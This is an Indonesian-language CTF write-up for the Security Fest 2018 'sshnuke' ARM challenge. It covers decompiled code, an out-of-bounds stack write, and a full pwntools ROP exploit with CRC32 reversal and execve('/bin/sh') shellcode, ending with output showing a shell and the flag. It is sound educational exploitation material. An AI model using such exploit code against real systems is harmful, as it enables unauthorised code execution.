@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Security Fest CTF 2018 - sshnuke https://nmap.org/movies/matrix/matrix-nmap.mp4 . The flag is in /home/ctf/flag. Attachment : placcholder  12345$ cat ./run-dbg.shsocat TCP4-LISTEN:5555,fork,tcpwrap=s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Security Fest CTF 2018 - sshnuke">
+<meta property="og:url" content="https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/index.html">
+<meta property="og:site_name" content="Catousify">
+<meta property="og:description" content="Security Fest CTF 2018 - sshnuke https://nmap.org/movies/matrix/matrix-nmap.mp4 . The flag is in /home/ctf/flag. Attachment : placcholder  12345$ cat ./run-dbg.shsocat TCP4-LISTEN:5555,fork,tcpwrap=s">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-16T17:54:22.645Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Security Fest CTF 2018 - sshnuke">
+<meta name="twitter:description" content="Security Fest CTF 2018 - sshnuke https://nmap.org/movies/matrix/matrix-nmap.mp4 . The flag is in /home/ctf/flag. Attachment : placcholder  12345$ cat ./run-dbg.shsocat TCP4-LISTEN:5555,fork,tcpwrap=s">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/img/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/img/favicon-96x96.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Security Fest CTF 2018 - sshnuke</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Catousify" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/06/02/Security-Fest-CTF-2018-bluepill/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/05/07/simple-vm-joints-2018-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&text=Security Fest CTF 2018 - sshnuke"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&is_video=false&description=Security Fest CTF 2018 - sshnuke"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Security Fest CTF 2018 - sshnuke&body=Check out this article: https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&name=Security Fest CTF 2018 - sshnuke&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analisa"><span class="toc-number">1.</span> <span class="toc-text">Analisa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug"><span class="toc-number">2.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attacc"><span class="toc-number">3.</span> <span class="toc-text">Attacc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-Exploit"><span class="toc-number">4.</span> <span class="toc-text">Final Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-Failed-Attack-Ideas"><span class="toc-number">5.</span> <span class="toc-text">Some Failed Attack Ideas</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Security Fest CTF 2018 - sshnuke
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Catousify</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-06-02T03:52:00.000Z" itemprop="datePublished">2018-06-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>Security Fest CTF 2018 - sshnuke</p>
+<p><a href="https://nmap.org/movies/matrix/matrix-nmap.mp4" target="_blank" rel="noopener">https://nmap.org/movies/matrix/matrix-nmap.mp4</a> . The flag is in /home/ctf/flag.</p>
+<p>Attachment : placcholder</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./run-dbg.sh</span><br><span class="line">socat TCP4-LISTEN:5555,fork,tcpwrap=script EXEC:<span class="string">"./qemu-arm -g 3333 -nx ./sshnuke"</span>,pty,stderr&amp;</span><br><span class="line"></span><br><span class="line">$ file ./sshnuke</span><br><span class="line">./sshnuke: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildIDsha1]=e76163966885ee563300455e4cd3c1d1e309234b, not stripped</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap run completed --- 1 IP address (1 host up) scanned</span><br><span class="line"># sshnuke 10.2.2.2 -rootpw=&apos;Z10N0101&apos;</span><br><span class="line"></span><br><span class="line">Connecting to 10.2.2.2:ssh ... successful.</span><br><span class="line">Attempting to exploit SSHv1 CRC32 ... successful.</span><br><span class="line">Loading backdoor ... successful.</span><br><span class="line">Login: </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">BACKDOOR MENU </span><br><span class="line"> 1) Store secret data</span><br><span class="line"> 2) Read secret data</span><br><span class="line"> 3) Run payload</span><br><span class="line"> 4) Quit</span><br><span class="line"> #nana@RRF-CONTROL&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Select storage slot: .. </span><br><span class="line">Data for storage: ..</span><br><span class="line">[+] Stored .... in slot ...</span><br><span class="line">Store more? (y/n): ..</span><br></pre></td></tr></table></figure>
+<h2 id="Analisa"><a href="#Analisa" class="headerlink" title="Analisa"></a>Analisa</h2><p>Binary ARM static-link, <code>NX</code> enabled karena saat dijalankan dengan <code>./qemu-arm</code> digunakan opsi <code>-nx</code>.  Programnya punya 4 fungsi, <code>store</code>, <code>read</code>, <code>run_payload</code>, <code>quit</code>. Fungsi <code>run_payload</code> disini sebenarnya agak <em>misleading</em> karena yang dilakukan hanya memanggil <code>sleep()</code> dan fungsi <code>quit</code>, well,  hanya keluar dari program.</p>
+<p>Fungsi <code>store data</code>, yang unik dari dari fungsi ini, data yang disimpan bukan berupa raw data, tapi berupa hash crc32 dari data. crc32 sendiri masih berupa crc32 yang “<em>normal</em>“ karena konstanta <code>poly = 0x04c11db7</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">crc32</span><span class="params">(<span class="keyword">unsigned</span> int8 *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> init; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [sp+14h] [bp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> int8 *c_buf; <span class="comment">// [sp+20h] [bp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !has_table )                             <span class="comment">// generate_crc_table</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp; <span class="number">1</span> )</span><br><span class="line">          v4 = (v4 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v4 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      crc_table[i] = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    has_table = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  init = <span class="number">0xFFFFFFFF</span>;                            <span class="comment">// calc_crc_32</span></span><br><span class="line">  <span class="keyword">for</span> ( cbuf = buf; cbuf &lt; &amp;buf[len]; ++cbuf )</span><br><span class="line">    init = crc_table[*cbuf ^ (<span class="keyword">unsigned</span> int8)init] ^ (init &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~init;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">do_store</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;data_5948, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">  read((<span class="keyword">int</span>)&amp;data_5948, (<span class="keyword">void</span> *)<span class="number">0x100</span>, v0);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(&amp;data_5948);</span><br><span class="line">  <span class="keyword">return</span> crc32((<span class="keyword">unsigned</span> __int8 *)&amp;data_5948, v1 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">12</span>]; <span class="comment">// [sp+30h] [bp-Ch]</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    write_str(<span class="string">"Select storage slot: "</span>);</span><br><span class="line">    storage_index_5959 = select_slot();</span><br><span class="line">    write_str(<span class="string">"Data for storage: "</span>);</span><br><span class="line">    v0 = storage_index_5959;</span><br><span class="line">    *(_DWORD_ *)&amp;v1[<span class="number">4</span> * v0 - <span class="number">44</span>] = do_store();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\x1b[32m+\x1b[0m] Stored %x in slot %d"</span>, *(_DWORD *)&amp;v1[<span class="number">4</span> * storage_index_5959 - <span class="number">44</span>], storage_index_5959);</span><br><span class="line">    write_str(<span class="string">"Store more? (y/n): "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( read_answer() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Fungsi <code>read data</code>, ga ada yang unik dari fungsi ini selain membaca data pada <code>v1</code> (stack).</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_store</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0[<span class="number">4</span>]; <span class="comment">// [sp+30h] [bp-4h]</span></span><br><span class="line"></span><br><span class="line">  write_str(<span class="string">"Select slot to read from: "</span>);</span><br><span class="line">  storage_index_5968 = select_slot();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[\x1b[32m+\x1b[0m] Read %x from slot %d\n"</span>, *(_DWORD *)&amp;v0[<span class="number">4</span> * storage_index_5968 - <span class="number">44</span>], storage_index_5968);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>Bug program ini ada pada fungsi <code>store</code> dan <code>read_store</code>, yakni array out-of-bound karena tidak ada pengecekan pada batasan pada <code>v0</code>. Sebagai ilustrasi, mis. <code>v0 = 14</code> =&gt; <code>v1[4 * v0 - 44]</code> =&gt; <strong><code>v1[20]</code></strong>. <code>v[16] =&gt; bp</code> (mirip ebp kalau di x86), <code>v[20] =&gt; pc</code> (mirip saved eip kalau di x86)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> v1[<span class="number">12</span>]; <span class="comment">// [sp+30h] [bp-Ch]</span></span><br><span class="line">...</span><br><span class="line">  storage_index_5959 = select_slot();</span><br><span class="line">...</span><br><span class="line">  v0 = storage_index_5959;</span><br><span class="line">  *(_DWORD_ *)&amp;v1[<span class="number">4</span> * v0 - <span class="number">44</span>] = do_store(); <span class="comment">// out-of-bound</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">char</span> v0[<span class="number">4</span>]; <span class="comment">// [sp+30h] [bp-4h]</span></span><br><span class="line">...</span><br><span class="line">  storage_index_5968 = select_slot();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[\x1b[32m+\x1b[0m] Read %x from slot %d\n"</span>, *(_DWORD *)&amp;v0[<span class="number">4</span> * storage_index_5968 - <span class="number">44</span>], storage_index_5968);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Attacc"><a href="#Attacc" class="headerlink" title="Attacc"></a>Attacc</h2><center><b>He protecc, He attacc, but most importantly he got da flacc.</b></center>
+
+<p>Ok, udah tahu bugnya, gimana cara exploit-nya? bisa <code>write_to_stack</code> dimana aja relatif terhadap <code>v0</code>/<code>v1</code>. Nah, karena binary ini <code>NX</code> enabled jadi yang bisa dilakukan itu ROP. Sebagai gambaran, ROP yang mau dicapai itu execve, (shellcode diambil dari azeria-labs)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">        add r0, pc, #12</span><br><span class="line">        mov r1, #0</span><br><span class="line">        mov r2, #0</span><br><span class="line">        mov r7, #11</span><br><span class="line">        svc #0</span><br><span class="line"></span><br><span class="line">.ascii &quot;/bin/sh\0&quot;</span><br></pre></td></tr></table></figure>
+<p>Sebelum bahasan agak lebih jauh, <code>write_to_stack</code> ini sendiri ada batasannya juga, data yang ditulis di stack itu crc32 dari data yang di input. Agak sedikit tricky, untungnya ada tools dari <a href="http://reveng.sourceforge.net" target="_blank" rel="noopener">http://reveng.sourceforge.net</a> untuk reverse crc32.</p>
+<p>ROP di arm sebenernya ga jauh beda dengan ROP di x86, intinya sama harus cari gadgets yang “<em>reliable</em>“ untuk kontrol pc dan register. Baca lanjut yang lebih jelas ke <a href="https://azeria-labs.com/" target="_blank" rel="noopener">https://azeria-labs.com/</a> untuk ARM exploitations.</p>
+<hr>
+<h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>gadgets yang dipakai untuk final exploit ini gak langsung <code>pop</code> semua register karena untuk menghindari bad bytes saat <em>transmisi data?</em></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#r = remote('127.0.0.1', 5555)</span></span><br><span class="line">r = remote(<span class="string">'159.65.80.92'</span>, <span class="number">31337</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">'[ENTER TO CONTINUE]'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_stack</span><span class="params">(pos, buf, more=True)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'slot: '</span>, str(pos))</span><br><span class="line">    r.sendlineafter(<span class="string">'storage: '</span>, buf)</span><br><span class="line">    <span class="keyword">print</span> r.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    r.sendline(<span class="string">'y'</span> <span class="keyword">if</span> more <span class="keyword">else</span> <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_crc32</span><span class="params">(x)</span>:</span></span><br><span class="line">    buf = (((x &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>) | ((x &lt;&lt;  <span class="number">8</span>) &amp; <span class="number">0x00FF0000</span>) | ((x &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x0000FF00</span>) | ((x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x000000FF</span>))</span><br><span class="line">    buf = hex(buf)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    m = process([<span class="string">'./reveng/reveng'</span>, <span class="string">'-m'</span>, <span class="string">'crc-32'</span>, <span class="string">'-v'</span>, buf])</span><br><span class="line">    ret = m.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    m.close()</span><br><span class="line">    <span class="keyword">return</span> ret.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'WARN'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p32(<span class="number">0x0006ef8c</span>)</span><br><span class="line">payload += p32(<span class="number">0x0006ef8c</span>)</span><br><span class="line">payload += p32(<span class="number">0x0006ef8c</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload) <span class="comment">#login</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>) <span class="comment"># menu store</span></span><br><span class="line"></span><br><span class="line">write_to_stack(<span class="number">13</span>, reverse_crc32(<span class="number">0x00099014</span>)) <span class="comment"># fp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop &#123;r0, r1, r3, ip, lr&#125;; pop &#123;r2&#125;; ldr r1, [r0, #4]; bx r1;</span></span><br><span class="line">write_to_stack(<span class="number">14</span>, reverse_crc32(<span class="number">0x0005ab18</span>)) <span class="comment"># pc</span></span><br><span class="line">write_to_stack(<span class="number">15</span>, reverse_crc32(<span class="number">0x00099020</span>)) <span class="comment"># r0</span></span><br><span class="line">write_to_stack(<span class="number">16</span>, <span class="string">''</span>) <span class="comment"># r1</span></span><br><span class="line">write_to_stack(<span class="number">17</span>, reverse_crc32(<span class="number">0x0006ef8c</span>)) <span class="comment"># r3</span></span><br><span class="line">write_to_stack(<span class="number">18</span>, <span class="string">''</span>) <span class="comment"># ip</span></span><br><span class="line">write_to_stack(<span class="number">19</span>, reverse_crc32(<span class="number">0x0001a194</span>)) <span class="comment"># lr</span></span><br><span class="line">write_to_stack(<span class="number">20</span>, <span class="string">''</span>) <span class="comment"># r2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop &#123;r0, pc&#125;</span></span><br><span class="line">write_to_stack(<span class="number">21</span>, reverse_crc32(<span class="number">0x00099014</span>)) <span class="comment"># r0</span></span><br><span class="line">write_to_stack(<span class="number">22</span>, reverse_crc32(<span class="number">0x0006e810</span>)) <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub r1, r1, r3; bx lr;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop &#123;r7, pc&#125;</span></span><br><span class="line">write_to_stack(<span class="number">23</span>, reverse_crc32(<span class="number">11</span>))</span><br><span class="line">write_to_stack(<span class="number">24</span>, reverse_crc32(<span class="number">0x0004e8a8</span>), more=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># svc 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">λ › python solve.py</span><br><span class="line">[+] Opening connection to 159.65.80.92 on port 31337: Done</span><br><span class="line">[ENTER TO CONTINUE]</span><br><span class="line">[+] Stored 99014 <span class="keyword">in</span> slot 13</span><br><span class="line">[+] Stored 5ab18 <span class="keyword">in</span> slot 14</span><br><span class="line">[+] Stored 99020 <span class="keyword">in</span> slot 15</span><br><span class="line">[+] Stored 0 <span class="keyword">in</span> slot 16</span><br><span class="line">[+] Stored 6ef8c <span class="keyword">in</span> slot 17</span><br><span class="line">[+] Stored 0 <span class="keyword">in</span> slot 18</span><br><span class="line">[+] Stored 1a194 <span class="keyword">in</span> slot 19</span><br><span class="line">[+] Stored 0 <span class="keyword">in</span> slot 20</span><br><span class="line">[+] Stored 99014 <span class="keyword">in</span> slot 21</span><br><span class="line">[+] Stored 6e810 <span class="keyword">in</span> slot 22</span><br><span class="line">[+] Stored b <span class="keyword">in</span> slot 23</span><br><span class="line">[+] Stored 4e8a8 <span class="keyword">in</span> slot 24</span><br><span class="line">Store more? (y/n): $ n</span><br><span class="line">sh: 1: n: not found</span><br><span class="line">$ id</span><br><span class="line">uid=999(ctf) gid=999(ctf) groups=999(ctf)</span><br><span class="line">$ cat /home/ctf/flag</span><br><span class="line">sctf&#123;pUts_0n_sh4d3s_w3r3_1n&#125;</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to 159.65.80.92 port 31337</span><br></pre></td></tr></table></figure>
+<center><code>FLAG : sctf{pUts_0n_sh4d3s_w3r3_1n}</code></center>
+
+<hr>
